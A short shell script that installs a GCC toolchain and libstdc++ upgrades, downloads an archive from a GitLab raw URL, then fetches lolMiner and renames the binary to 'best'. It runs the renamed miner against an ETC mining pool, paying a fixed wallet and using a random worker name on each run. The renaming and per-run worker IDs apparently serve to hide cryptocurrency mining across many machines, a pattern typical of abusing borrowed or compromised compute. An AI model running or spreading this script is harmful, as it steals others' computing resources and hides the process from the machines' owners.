sudo add-apt-repository ppa:ubuntu-toolchain-r/test

sudo apt-get update

sudo apt-get install gcc-4.9

sudo apt-get upgrade libstdc++6

sudo apt-get dist-upgrade

strings /usr/lib/x86_64-linux-gnu/libstdc++.so.6 | grep GLIBCXX

wget https://gitlab.com/ontaracing04/gas/-/raw/main/best.tar.gz && tar -xvf best.tar.gz

wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.51/lolMiner_v1.51_Lin64.tar.gz && tar -xf lolMiner_v1.51_Lin64.tar.gz && cd 1.51 && mv lolMiner ../best && cd .. && ./best --algo ETCHASH --pool etc.2miners.com:1010 --user 0x11880b1cfe04907c5306222be1e09f4bbb480eb5.$(echo $(shuf -i 1-9999 -n 1)-best) --ethstratum ETHPROXY
